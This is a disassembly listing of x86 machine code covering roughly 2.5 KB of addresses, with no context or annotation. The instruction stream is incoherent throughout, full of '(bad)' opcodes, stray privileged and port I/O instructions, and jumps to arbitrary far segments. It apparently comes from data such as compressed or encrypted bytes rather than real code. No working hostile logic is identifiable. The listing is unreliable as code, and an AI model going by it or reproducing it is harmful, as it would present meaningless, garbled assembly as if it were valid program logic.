  42e57c:	xchg   esp,eax
  42e57d:	outs   dx,DWORD PTR ds:[esi]
  42e57e:	ror    DWORD PTR [edi-0xc],0x40
  42e582:	cwde   
  42e583:	inc    eax
  42e584:	cmp    BYTE PTR [eax],ah
  42e586:	pushf  
  42e587:	lods   eax,DWORD PTR ds:[esi]
  42e588:	dec    edx
  42e589:	mov    edx,0x784cdcdc
  42e58e:	(bad)  [esi]
  42e590:	sub    eax,0x0
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	xor    DWORD PTR [ebp+esi*2+0x1f15ecc],edi
  42e607:	add    BYTE PTR ds:0xf9000001,al
  42e60d:	dec    esi
  42e60e:	mov    eax,ds:0xdf393279
  42e613:	sub    al,0xcc
  42e615:	adc    eax,0xd9d46f4
  42e61a:	std    
  42e61b:	jns    0x42e601
  42e61d:	mov    al,0xe7
  42e61f:	fst    st(3)
  42e621:	pop    ds
  42e622:	pop    ebp
  42e623:	cmp    dl,dl
  42e625:	or     al,0x7c
  42e627:	and    al,0x2b
  42e629:	loop   0x42e679
  42e62b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e62c:	repnz pop ebx
  42e62e:	pusha  
  42e62f:	inc    esi
  42e630:	add    BYTE PTR [eax+eax*8-0x2d6f20bf],bh
  42e637:	loopne 0x42e630
  42e639:	nop
  42e63a:	and    DWORD PTR [ebx+0x3461b558],ebp
  42e640:	gs xchg edx,eax
  42e642:	sub    BYTE PTR [ebp-0x50cc7a0c],dl
  42e648:	cmp    al,0x2f
  42e64a:	add    eax,0x3baa4441
  42e64f:	(bad)  
  42e650:	cli    
  42e651:	jle    0x42e5e5
  42e653:	imul   BYTE PTR [ebx]
  42e655:	sub    eax,0x2f80d34c
  42e65a:	sti    
  42e65b:	pop    esp
  42e65c:	adc    ebp,DWORD PTR [esi-0x858a23a]
  42e662:	push   ds
  42e663:	mov    WORD PTR [ecx+ebp*8+0x3dfb2a9e],cs
  42e66a:	popf   
  42e66b:	lea    edx,[ebp-0x1a]
  42e66e:	pop    edx
  42e66f:	adc    BYTE PTR [ebx],dh
  42e671:	jle    0x42e615
  42e673:	xor    DWORD PTR ds:0xbe209f0f,esi
  42e679:	into   
  42e67a:	inc    esp
  42e67b:	mov    dl,0x54
  42e67d:	mov    esi,0x1e1d778f
  42e682:	rol    DWORD PTR [edx+0x51],0x14
  42e686:	mov    dl,0xc5
  42e688:	mov    cl,0x7e
  42e68a:	add    al,0x8a
  42e68c:	pop    ebx
  42e68d:	sbb    eax,0x3e8eb38b
  42e692:	and    ah,bh
  42e694:	fst    DWORD PTR [ecx-0x7ea26597]
  42e69a:	push   es
  42e69b:	loop   0x42e70f
  42e69d:	jmp    DWORD PTR [edx+0x2f9522e9]
  42e6a3:	ret    
  42e6a4:	dec    ebp
  42e6a5:	mov    esi,esi
  42e6a7:	mov    ch,0x22
  42e6a9:	ja     0x42e702
  42e6ab:	scas   eax,DWORD PTR es:[edi]
  42e6ac:	(bad)  
  42e6ae:	(bad)  
  42e6af:	mov    al,ds:0xf5f1f940
  42e6b4:	adc    al,0x14
  42e6b6:	sub    al,0x3b
  42e6b8:	mov    ah,0x60
  42e6ba:	mov    al,ds:0x567d1e69
  42e6bf:	pop    edx
  42e6c0:	inc    ebp
  42e6c1:	push   DWORD PTR [eax-0x44a930be]
  42e6c7:	and    ah,BYTE PTR es:0x66f67277
  42e6ce:	mov    ds:0x35faa65,eax
  42e6d3:	mov    BYTE PTR [ebx-0x6c],bl
  42e6d6:	jbe    0x42e72d
  42e6d8:	mov    ecx,0xa413ac2d
  42e6dd:	cmp    bl,0x25
  42e6e0:	xor    ch,bh
  42e6e2:	mov    eax,ds:0xbf017408
  42e6e7:	loopne 0x42e6aa
  42e6e9:	imul   al
  42e6eb:	data16 in al,0x1
  42e6ee:	fs push es
  42e6f0:	mov    edi,cs
  42e6f2:	pop    edx
  42e6f3:	hlt    
  42e6f4:	jns    0x42e687
  42e6f6:	mov    eax,0x3c6b81a5
  42e6fb:	mov    WORD PTR [eax+0x10],es
  42e6fe:	call   0x58a5f28c
  42e703:	inc    edi
  42e704:	lock push ds
  42e706:	les    edi,FWORD PTR [ebx]
  42e708:	adc    eax,0x18ad6187
  42e70d:	jmp    0xa44723
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fiadd  DWORD PTR [eax+0x635843ea]
  42e785:	repnz add DWORD PTR [eax],eax
  42e788:	add    eax,0xf4000001
  42e78d:	or     DWORD PTR [ebp+edi*2+0x1],ebp
  42e791:	daa    
  42e792:	call   0x65346cf2
  42e797:	pushf  
  42e798:	pop    eax
  42e799:	fs pusha 
  42e79b:	pop    esi
  42e79c:	push   ebx
  42e79d:	icebp  
  42e79e:	jecxz  0x42e7f8
  42e7a0:	mov    eax,ds:0xf9f4eca1
  42e7a5:	push   ebp
  42e7a6:	(bad)  
  42e7a7:	js     0x42e7ed
  42e7a9:	xchg   DWORD PTR [edi-0x3d],esi
  42e7ac:	dec    esp
  42e7ad:	in     al,0x49
  42e7af:	mov    WORD PTR [ebx+0x6e],fs
  42e7b2:	adc    DWORD PTR [esi],0xffffff81
  42e7b5:	xchg   ecx,eax
  42e7b6:	cmp    eax,ecx
  42e7b8:	mov    edi,0x5748cd21
  42e7bd:	sar    DWORD PTR [edi-0x79],cl
  42e7c0:	imul   ecx,DWORD PTR [ecx+0x403b644],0x13a882d1
  42e7ca:	stos   BYTE PTR es:[edi],al
  42e7cb:	es mov ah,0xbf
  42e7ce:	ror    BYTE PTR [edi-0x71a09de2],1
  42e7d4:	test   ebx,0xc865ecc9
  42e7da:	pop    es
  42e7db:	dec    edi
  42e7dc:	inc    esi
  42e7dd:	pop    esi
  42e7de:	and    cl,BYTE PTR [eax+0x6498f55b]
  42e7e4:	pop    ds
  42e7e5:	mov    ds:0x5f201384,eax
  42e7ea:	aam    0xbf
  42e7ec:	push   esi
  42e7ed:	jno    0x42e79e
  42e7ef:	sbb    eax,0x9c7d7be4
  42e7f4:	pop    ecx
  42e7f5:	sahf   
  42e7f6:	xchg   edx,eax
  42e7f7:	mov    WORD PTR [ecx],?
  42e7f9:	ja     0x42e821
  42e7fb:	jbe    0x42e819
  42e7fd:	test   al,0x54
  42e7ff:	not    DWORD PTR [esp+ebp*2]
  42e802:	sub    ah,bh
  42e804:	(bad)  
  42e805:	and    al,0x8d
  42e807:	fimul  WORD PTR [esi]
  42e809:	ret    0x1191
  42e80c:	or     al,0x32
  42e80e:	scas   eax,DWORD PTR es:[edi]
  42e80f:	hlt    
  42e810:	cld    
  42e811:	mov    bl,0x5a
  42e813:	xchg   edi,eax
  42e814:	int3   
  42e815:	(bad)  
  42e816:	seta   bh
  42e819:	mov    esp,0xf42e1a9
  42e81e:	call   0x9f91:0xedbce3de
  42e825:	loop   0x42e8a6
  42e827:	pop    ecx
  42e828:	jmp    0x7504:0x9aded203
  42e82f:	jle    0x42e7d8
  42e831:	popf   
  42e832:	(bad)  
  42e833:	into   
  42e834:	inc    eax
  42e835:	iret   
  42e836:	pop    esi
  42e837:	sahf   
  42e838:	fwait
  42e839:	lods   al,BYTE PTR ds:[esi]
  42e83a:	add    cl,dh
  42e83c:	call   0x7af8:0x29763c80
  42e843:	mov    edi,0x7069c0c9
  42e848:	jb     0x42e8a7
  42e84a:	inc    ebp
  42e84b:	in     al,dx
  42e84c:	rcr    dl,0x9d
  42e84f:	cmp    BYTE PTR [edi-0x45],dl
  42e852:	aam    0x7f
  42e854:	imul   edi,DWORD PTR [ecx+0x6],0x2a3f17c5
  42e85b:	mov    eax,ds:0xdd7edd79
  42e860:	push   0x72
  42e862:	dec    edi
  42e863:	lea    eax,[ebp+0x11]
  42e866:	add    DWORD PTR [ebp+0x46],0x9b6305b5
  42e86d:	jmp    0x42e826
  42e86f:	xchg   BYTE PTR [esi-0x31],bh
  42e872:	inc    esi
  42e873:	add    DWORD PTR ds:0xb348b710,ebp
  42e879:	jecxz  0x42e822
  42e87b:	sub    eax,0x851600e1
  42e880:	jns    0x42e85c
  42e882:	sub    dh,BYTE PTR [edx+0x7076e2c6]
  42e888:	sub    eax,0x5ee13e7c
  42e88d:	icebp  
  42e88e:	fidivr DWORD PTR [ebx+0xa2]
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x3f23f82b]
  42e901:	sub    esp,ebp
  42e903:	push   esp
  42e904:	push   0x50001f3
  42e909:	add    DWORD PTR [eax],eax
  42e90b:	add    BYTE PTR [ebp+0x1f117cd0],ch
  42e911:	loopne 0x42e8ce
  42e913:	das    
  42e914:	or     al,0x87
  42e916:	loope  0x42e943
  42e918:	nop
  42e919:	xor    DWORD PTR fs:[edi-0x38],esp
  42e91d:	sbb    dh,BYTE PTR [ebp+esi*8-0x5e]
  42e921:	xor    eax,0x77a2377a
  42e926:	les    ecx,FWORD PTR [edx]
  42e928:	sti    
  42e929:	jbe    0x42e967
  42e92b:	xor    al,0xe0
  42e92d:	and    bl,cl
  42e92f:	pop    ebx
  42e930:	mov    ss,WORD PTR fs:[edx-0x4a]
  42e934:	mov    esi,0xa237a761
  42e939:	sbb    BYTE PTR ds:0xd54a8454,0x8b
  42e940:	sbb    eax,DWORD PTR [edx+0x25]
  42e943:	sub    esi,DWORD PTR [edi-0x5c94dbfc]
  42e949:	data16 add BYTE PTR [ecx+0x24],al
  42e94d:	cdq    
  42e94e:	add    DWORD PTR ds:0x7bbd4889,0x59
  42e955:	jno    0x42e99e
  42e957:	mov    al,ds:0x3e32fe41
  42e95c:	(bad)  
  42e95d:	fstp   st(0)
  42e95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e960:	sub    BYTE PTR [edx-0x6c607036],cl
  42e966:	sbb    BYTE PTR [ebp-0x298064ae],ch
  42e96c:	xchg   esi,eax
  42e96d:	add    al,ch
  42e96f:	xchg   edi,eax
  42e970:	mov    esi,0xc30f4eea
  42e975:	sub    ebx,esi
  42e977:	shl    WORD PTR [ecx],cl
  42e97a:	xchg   esp,eax
  42e97b:	mov    DWORD PTR [ecx-0xd45edf6],edx
  42e981:	add    eax,0xdf2c0c74
  42e986:	fadd   DWORD PTR [edi+0x5d3fe997]
  42e98c:	jns    0x42e9cd
  42e98e:	xor    ebx,DWORD PTR [esi+0x6c]
  42e991:	fnstenv [edi+0x77396288]
  42e997:	(bad)  
  42e998:	cld    
  42e999:	inc    ecx
  42e99a:	imul   esi,DWORD PTR [edi],0xffffffe7
  42e99d:	test   DWORD PTR [edi],esi
  42e99f:	imul   edx,DWORD PTR [eax-0x249e3c07],0xba49018d
  42e9a9:	pop    edi
  42e9aa:	sub    BYTE PTR [ebx],0xfc
  42e9ad:	out    0x73,al
  42e9af:	addr16 shr al,0x6
  42e9b3:	mov    BYTE PTR [esi],ch
  42e9b5:	mov    al,ds:0x84429cc7
  42e9ba:	(bad)  
  42e9bc:	or     BYTE PTR ds:0xfa3633cb,0x3f
  42e9c3:	sbb    DWORD PTR [esi],eax
  42e9c5:	(bad)
  42e9c8:	mov    al,BYTE PTR [esi-0x51d5971c]
  42e9ce:	jb     0x42ea1d
  42e9d0:	and    ch,ah
  42e9d2:	inc    esp
  42e9d3:	(bad)  
  42e9d4:	retf   0xffcc
  42e9d7:	mov    ecx,0xc8877aab
  42e9dc:	loop   0x42e976
  42e9de:	pusha  
  42e9df:	aas    
  42e9e0:	mov    ebx,0xe80d5cc0
  42e9e5:	outs   dx,BYTE PTR ds:[esi]
  42e9e6:	(bad)  
  42e9e7:	scas   eax,DWORD PTR es:[edi]
  42e9e8:	ds (bad) 
  42e9ea:	out    0x52,eax
  42e9ec:	push   cs
  42e9ed:	popf   
  42e9ee:	mov    dl,0xc2
  42e9f0:	mov    ds:0x5b611092,al
  42e9f5:	jle    0x42e9ea
  42e9f7:	mov    ah,0x9e
  42e9f9:	stos   BYTE PTR es:[edi],al
  42e9fa:	sbb    eax,0xc426d218
  42e9ff:	mov    al,0x2f
  42ea01:	mov    esp,0x75d821b0
  42ea06:	xlat   BYTE PTR ds:[ebx]
  42ea07:	add    eax,0x1bfe44fe
  42ea0c:	adc    BYTE PTR [esi],cl
  42ea0e:	fild   WORD PTR [eax-0xe]
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	sub    BYTE PTR [edi+edi*8],al
  42ea83:	cld    
  42ea84:	ins    DWORD PTR es:[edi],dx
  42ea85:	hlt    
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    eax,0xf5000001
  42ea8d:	lea    edx,[esi-0x101e781f]
  42ea93:	stc    
  42ea94:	aad    0xb4
  42ea96:	enter  0x5859,0xc1
  42ea9a:	loopne 0x42eb08
  42ea9c:	jmp    0x4f755042
  42eaa1:	mov    edx,DWORD PTR [eax]
  42eaa3:	inc    ebp
  42eaa4:	je     0x42eaab
  42eaa6:	mov    al,ds:0x97cefaae
  42eaab:	push   ebp
  42eaac:	push   ecx
  42eaad:	jno    0x42ea35
  42eaaf:	fld    DWORD PTR [edi]
  42eab1:	pop    ss
  42eab2:	xor    al,BYTE PTR [edx]
  42eab4:	jmp    0x65c4:0x2b3d5e5f
  42eabb:	sub    ch,BYTE PTR [eax]
  42eabd:	dec    ebp
  42eabe:	neg    BYTE PTR [eax]
  42eac0:	add    ah,BYTE PTR [edi+0xe]
  42eac3:	fstp   QWORD PTR [ecx+edi*2-0x596b8ab9]
  42eaca:	sar    ecx,0x54
  42eacd:	pop    ds
  42eace:	mov    bl,0x7e
  42ead0:	jecxz  0x42ea63
  42ead2:	mov    fs,WORD PTR [eax-0x1d2c3e7d]
  42ead8:	xor    DWORD PTR [ebx],edi
  42eada:	es mov esi,0x14f40fd5
  42eae0:	xor    eax,0xa175610d
  42eae5:	leave  
  42eae6:	fadd   DWORD PTR [edi+0x72c94f3b]
  42eaec:	inc    edi
  42eaed:	ret    0xcb96
  42eaf0:	imul   edi,DWORD PTR [ebx-0x535a08b2],0x37
  42eaf7:	sbb    DWORD PTR [eax-0x59],ebp
  42eafa:	rcr    BYTE PTR [edi-0x2a],1
  42eafd:	(bad)  
  42eafe:	imul   esp,ecx,0x519bc80f
  42eb04:	dec    DWORD PTR [edx-0x2b8f7b3d]
  42eb0a:	shl    bh,1
  42eb0c:	jl     0x42eadc
  42eb0e:	rcr    BYTE PTR [edx+0x3d2a285f],cl
  42eb14:	or     ah,BYTE PTR [eax-0x55a7221e]
  42eb1a:	loope  0x42eb36
  42eb1c:	add    BYTE PTR [esi],0x9c
  42eb1f:	cmp    DWORD PTR [edx+0x27ecde48],eax
  42eb25:	mov    ebp,0x3c802a71
  42eb2a:	sub    BYTE PTR [esp+ebp*8],0x2d
  42eb2e:	inc    ebp
  42eb2f:	shl    DWORD PTR [ebx],1
  42eb31:	dec    ebx
  42eb32:	xchg   DWORD PTR [edx],ebp
  42eb34:	(bad)  
  42eb35:	rcr    DWORD PTR [esi-0x7e8b8a0e],0x3f
  42eb3c:	ds je  0x42eb56
  42eb3f:	pop    es
  42eb40:	mov    esi,ds
  42eb42:	pop    ds
  42eb43:	mov    dh,0x97
  42eb45:	dec    eax
  42eb46:	and    eax,0xf18dceed
  42eb4b:	sub    al,0x6c
  42eb4d:	cwde   
  42eb4e:	stos   DWORD PTR es:[edi],eax
  42eb4f:	pusha  
  42eb50:	ja     0x42eb3a
  42eb52:	dec    BYTE PTR [edi+edi*8-0x51]
  42eb56:	nop
  42eb57:	cli    
  42eb58:	cmp    ebp,DWORD PTR [edx-0x36]
  42eb5b:	inc    ebp
  42eb5c:	xor    al,0x3d
  42eb5e:	retf   
  42eb5f:	ret    
  42eb60:	retf   0x3b89
  42eb63:	outs   dx,DWORD PTR ds:[esi]
  42eb64:	and    bh,0xfc
  42eb67:	cs xor al,0xe8
  42eb6a:	je     0x42ebe2
  42eb6c:	jecxz  0x42eb8e
  42eb6e:	cmc    
  42eb6f:	jbe    0x42eb14
  42eb71:	les    ebp,FWORD PTR [eax-0x7c53017c]
  42eb77:	jno    0x42ebe5
  42eb79:	xor    dl,BYTE PTR [esi+0x72a64b58]
  42eb7f:	(bad)  
  42eb80:	jns    0x42eb4d
  42eb82:	sbb    eax,0x80faac47
  42eb87:	pop    ss
  42eb88:	or     al,0x5d
  42eb8a:	repz pushf 
  42eb8c:	sub    DWORD PTR [eax],edi
  42eb8e:	jae    0x42ec04
  42eb90:	and    eax,DWORD PTR [eax]
	...
  42ebf2:	add    BYTE PTR [eax],al
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	add    eax,0x724736ad
  42ec05:	cmc    
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    eax,0x8b000001
  42ec0d:	ins    BYTE PTR es:[edi],dx
  42ec0e:	xchg   bl,al
  42ec10:	hlt    
  42ec11:	mov    ecx,0xefa4f6b3
  42ec16:	pop    ebp
  42ec17:	sub    ecx,DWORD PTR [ebp-0x4f970dac]
  42ec1d:	inc    ecx
  42ec1e:	cmp    DWORD PTR [ebx+0x2],ecx
  42ec21:	fist   DWORD PTR [eax]
  42ec23:	pusha  
  42ec24:	xchg   ebx,eax
  42ec25:	push   0x630d78df
  42ec2a:	int    0x2b
  42ec2c:	add    dl,ch
  42ec2e:	in     al,dx
  42ec2f:	lock or ch,BYTE PTR [eax-0x66]
  42ec33:	std    
  42ec34:	pop    esi
  42ec35:	jl     0x42ec88
  42ec37:	(bad)  
  42ec38:	(bad)  
  42ec39:	cmc    
  42ec3a:	xchg   edx,eax
  42ec3b:	pop    ecx
  42ec3c:	scas   eax,DWORD PTR es:[edi]
  42ec3d:	hlt    
  42ec3e:	xor    ecx,ecx
  42ec40:	shr    eax,0x9d
  42ec43:	shr    ebx,cl
  42ec45:	stos   DWORD PTR es:[edi],eax
  42ec46:	inc    ebx
  42ec47:	push   edx
  42ec48:	pop    ebp
  42ec49:	pop    ecx
  42ec4a:	je     0x42ec82
  42ec4c:	adc    ecx,esp
  42ec4e:	ficomp WORD PTR [ecx-0x7c]
  42ec51:	sti    
  42ec52:	out    dx,eax
  42ec53:	pop    ss
  42ec54:	mov    esi,0xe8f78f14
  42ec59:	aaa    
  42ec5a:	mov    BYTE PTR [eax-0x2e273cd3],bl
  42ec60:	jo     0x42ecdd
  42ec62:	les    ecx,FWORD PTR [edi+0x5061976c]
  42ec68:	ja     0x42ec16
  42ec6a:	mov    esi,DWORD PTR [edx-0x687ee598]
  42ec70:	ror    DWORD PTR ds:0x8478d081,cl
  42ec76:	push   ds
  42ec77:	gs inc ebp
  42ec79:	jns    0x42ec44
  42ec7b:	out    dx,al
  42ec7c:	mov    edx,0x4aaeefad
  42ec81:	inc    ebp
  42ec82:	mov    DWORD PTR [ebp+0x49312d02],eax
  42ec88:	rol    esi,cl
  42ec8a:	nop
  42ec8b:	dec    ebx
  42ec8c:	and    DWORD PTR [eax+0x2c],edi
  42ec8f:	cli    
  42ec90:	ds daa 
  42ec92:	and    dh,dh
  42ec94:	and    ebx,DWORD PTR [esi-0x1f]
  42ec97:	cmp    eax,0x3718dbc8
  42ec9c:	pop    es
  42ec9d:	rcr    DWORD PTR [eax+0x2df3509],0xaf
  42eca4:	loope  0x42ec6e
  42eca6:	or     DWORD PTR [ecx+0x34efbf62],esp
  42ecac:	inc    ebp
  42ecad:	sbb    eax,DWORD PTR [ecx+0x26c2444b]
  42ecb3:	addr16 mov dl,0xbe
  42ecb6:	jg     0x42ec6c
  42ecb8:	add    BYTE PTR [edi],dh
  42ecba:	mov    DWORD PTR [edx-0xd],eax
  42ecbd:	fwait
  42ecbe:	jb     0x42ed01
  42ecc0:	out    dx,al
  42ecc1:	icebp  
  42ecc2:	xor    edi,DWORD PTR [ebx]
  42ecc4:	into   
  42ecc5:	adc    DWORD PTR [edi-0x8637bb8],eax
  42eccb:	retf   
  42eccc:	js     0x42ecdd
  42ecce:	push   edx
  42eccf:	out    dx,eax
  42ecd0:	pusha  
  42ecd1:	hlt    
  42ecd2:	mov    eax,0x5abae328
  42ecd7:	repz in al,0xce
  42ecda:	and    al,0xb3
  42ecdc:	shr    ah,0x7a
  42ecdf:	adc    BYTE PTR [eax],ch
  42ece1:	call   0x3683:0x2108325b
  42ece8:	addr16 push ds
  42ecea:	test   DWORD PTR [esi-0x4a],0xe4c31cae
  42ecf1:	scas   al,BYTE PTR es:[edi]
  42ecf2:	les    edx,FWORD PTR [ebx+esi*4]
  42ecf5:	mov    ch,0x3
  42ecf7:	dec    esp
  42ecf8:	xchg   edi,eax
  42ecf9:	add    al,BYTE PTR [ebx-0x39]
  42ecfc:	xchg   BYTE PTR [ebp-0x6],bh
  42ecff:	ret    0x3597
  42ed02:	jl     0x42ecb9
  42ed04:	fwait
  42ed05:	out    0xcf,al
  42ed07:	xor    DWORD PTR [edx+ecx*4-0x7e],esi
  42ed0b:	ret    
  42ed0c:	dec    esp
  42ed0d:	ror    BYTE PTR [esp+ebx*1+0x4a],1
	...
  42ed71:	add    BYTE PTR [eax],al
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x7a3d385e]
  42ed83:	or     BYTE PTR [edi-0xa],dh
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    eax,0x77000001
  42ed8d:	jle    0x42ed97
  42ed8f:	adc    al,0xc2
  42ed91:	pop    ecx
  42ed92:	in     al,dx
  42ed93:	xchg   edi,eax
  42ed94:	xchg   edx,eax
  42ed95:	scas   al,BYTE PTR es:[edi]
  42ed96:	stos   DWORD PTR es:[edi],eax
  42ed97:	cmp    ecx,edi
  42ed99:	(bad)  
  42ed9a:	mov    bh,0x2c
  42ed9c:	addr16 aam 0x2c
  42ed9f:	loope  0x42ed5a
  42eda1:	adc    BYTE PTR [edx+0x5b],al
  42eda4:	pop    ebx
  42eda5:	sub    edi,DWORD PTR [ecx-0x7f]
  42eda8:	retf   
  42eda9:	xchg   esp,eax
  42edaa:	inc    edx
  42edab:	fmul   st,st(2)
  42edad:	push   ds
  42edae:	push   edx
  42edaf:	ins    DWORD PTR es:[edi],dx
  42edb0:	mov    ecx,DWORD PTR [esi]
  42edb2:	test   al,0xa4
  42edb4:	xchg   eax,edi
  42edb6:	pop    eax
  42edb7:	mov    edx,0xba146a59
  42edbc:	mov    ah,0x24
  42edbe:	jg     0x42edd6
  42edc0:	loope  0x42ee0c
  42edc2:	ds and al,0x38
  42edc5:	xor    BYTE PTR [edx],dh
  42edc7:	loope  0x42edba
  42edc9:	out    0x7a,al
  42edcb:	xor    dh,BYTE PTR [esi+0x63737976]
  42edd1:	sub    eax,0x3a24769
  42edd6:	loop   0x42ee52
  42edd8:	adc    bl,BYTE PTR [edi-0x33]
  42eddb:	xchg   ebp,eax
  42eddc:	mov    ebx,0x68afe2b9
  42ede1:	mov    WORD PTR [edi],fs
  42ede3:	js     0x42edea
  42ede5:	mov    ah,0x1c
  42ede7:	out    0xf2,al
  42ede9:	pop    esi
  42edea:	cmp    BYTE PTR [esi],cl
  42edec:	mov    edi,0x3aa3ffab
  42edf1:	imul   esi,DWORD PTR [eax-0x7a],0xfffffffa
  42edf5:	leave  
  42edf6:	pusha  
  42edf7:	add    esp,DWORD PTR [eax+0x43]
  42edfa:	cmp    al,0x1a
  42edfc:	stos   DWORD PTR es:[edi],eax
  42edfd:	test   al,0xc9
  42edff:	clc    
  42ee00:	inc    BYTE PTR [ebp-0x39bf43cd]
  42ee06:	dec    esp
  42ee07:	ja     0x42ed9a
  42ee09:	inc    edx
  42ee0a:	out    dx,eax
  42ee0b:	or     BYTE PTR [eax-0x6c],0x4a
  42ee0f:	retf   
  42ee10:	jecxz  0x42edf3
  42ee12:	das    
  42ee13:	push   0x357ca4c6
  42ee18:	repz imul ebp,DWORD PTR [esi-0x4f58b0b9],0xa127271f
  42ee23:	xor    edx,ebx
  42ee25:	or     ch,BYTE PTR [eax-0x52]
  42ee28:	or     BYTE PTR [ebx-0xaa8492d],cl
  42ee2e:	lds    edi,FWORD PTR [ecx+0x76]
  42ee31:	(bad)  
  42ee32:	loop   0x42ee96
  42ee34:	inc    ecx
  42ee35:	bound  eax,QWORD PTR ds:0xbf8d7330
  42ee3b:	push   eax
  42ee3c:	adc    BYTE PTR [ebx-0xa0eae94],al
  42ee42:	mov    cl,bl
  42ee44:	jl     0x42ee05
  42ee46:	jmp    0xe18a3680
  42ee4b:	ins    DWORD PTR es:[edi],dx
  42ee4c:	in     eax,dx
  42ee4d:	mov    dh,0x40
  42ee4f:	test   DWORD PTR [ecx+0x4],esp
  42ee52:	dec    edi
  42ee53:	jnp    0x42edfc
  42ee55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee56:	mov    edx,0xd7fb5756
  42ee5b:	push   ss
  42ee5c:	mov    bh,0x73
  42ee5e:	ss jo  0x42ee1c
  42ee61:	add    eax,0xfb17376b
  42ee66:	retf   0x2e7b
  42ee69:	mov    WORD PTR [esi-0x6db8964a],?
  42ee6f:	rcl    DWORD PTR [edi-0x3c774992],0xff
  42ee76:	sub    esp,0x4
  42ee79:	adc    dh,BYTE PTR [esi+0x2d3028f3]
  42ee7f:	arpl   WORD PTR [ecx-0x4edcaa9],dx
  42ee85:	cmc    
  42ee86:	leave  
  42ee87:	popf   
  42ee88:	stc    
  42ee89:	(bad)  
  42ee8a:	fidiv  WORD PTR [ebx+0x28d33e64]
  42ee90:	popa   
	...
  42eef1:	add    BYTE PTR [eax],al
  42eef3:	add    bl,al
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	jmp    0x1f7:0x7c86b12f
  42ef07:	add    BYTE PTR ds:0xa5000001,al
  42ef0d:	mov    dh,0xcf
  42ef0f:	scas   al,BYTE PTR es:[edi]
  42ef10:	rol    DWORD PTR [ecx+0x78],cl
  42ef13:	cli    
  42ef14:	jg     0x42ef73
  42ef16:	fucom  st(1)
  42ef18:	dec    ebx
  42ef19:	mov    eax,0x8912f170
  42ef1e:	sub    ebx,esi
  42ef20:	fcomi  st,st(6)
  42ef22:	push   0x3563e6cb
  42ef27:	ret    
  42ef28:	dec    edx
  42ef29:	fs jae 0x42ef3c
  42ef2c:	push   edx
  42ef2d:	xor    eax,ebx
  42ef2f:	mov    esi,0xec306094
  42ef34:	push   ds
  42ef35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef36:	inc    ebx
  42ef37:	lds    ecx,FWORD PTR [ebp-0x503d5c98]
  42ef3d:	stos   DWORD PTR es:[edi],eax
  42ef3e:	loope  0x42eedd
  42ef40:	loope  0x42eef2
  42ef42:	push   edi
  42ef43:	sub    BYTE PTR [esi+0x6c],bl
  42ef46:	or     ecx,DWORD PTR cs:[ecx]
  42ef49:	sub    edx,DWORD PTR [ebp-0x12]
  42ef4c:	sub    eax,0xf12011bb
  42ef51:	xchg   esp,eax
  42ef52:	aam    0x8f
  42ef54:	sub    DWORD PTR [ebp+edx*1+0x79],eax
  42ef58:	sbb    al,0x69
  42ef5a:	mov    al,ds:0x68cdd5a7
  42ef5f:	sbb    DWORD PTR [ecx],0xc12ed6df
  42ef65:	inc    eax
  42ef66:	sbb    DWORD PTR [edi+0x2d],edi
  42ef69:	xchg   BYTE PTR [eax-0x2e],dh
  42ef6c:	cmp    esp,DWORD PTR [ebx+ecx*2]
  42ef6f:	pop    esp
  42ef70:	pop    edx
  42ef71:	jae    0x42efc9
  42ef73:	cmp    DWORD PTR [edi],ebp
  42ef75:	cld    
  42ef76:	dec    edi
  42ef77:	sub    BYTE PTR [ebx-0x3],ah
  42ef7a:	cmp    ah,BYTE PTR [ecx-0x48]
  42ef7d:	sub    eax,0x1e4c359b
  42ef82:	retf   
  42ef83:	(bad)  
  42ef84:	mov    bl,0x7a
  42ef86:	scas   al,BYTE PTR es:[edi]
  42ef87:	(bad)  
  42ef89:	hlt    
  42ef8a:	aad    0x97
  42ef8c:	inc    ecx
  42ef8d:	mov    BYTE PTR [edi+ebp*1-0x63],ah
  42ef91:	push   cs
  42ef92:	and    al,0xf3
  42ef94:	lods   eax,DWORD PTR cs:[esi]
  42ef96:	ret    
  42ef97:	or     bh,BYTE PTR [edx-0x6a]
  42ef9a:	lods   eax,DWORD PTR ds:[esi]
  42ef9b:	in     al,dx
  42ef9c:	das    
  42ef9d:	dec    esi
  42ef9e:	fcomp  DWORD PTR [ecx-0x1a]
  42efa1:	ss and cl,dh
  42efa4:	ror    DWORD PTR [esi],0x66
  42efa7:	push   ebx
  42efa8:	mov    BYTE PTR [esi-0x75],bl
  42efab:	mov    al,ds:0x2cc7b39a
  42efb0:	mov    ebp,0xae4842ac
  42efb5:	out    dx,eax
  42efb6:	inc    esp
  42efb7:	inc    esp
  42efb8:	xlat   BYTE PTR ds:[ebx]
  42efb9:	int3   
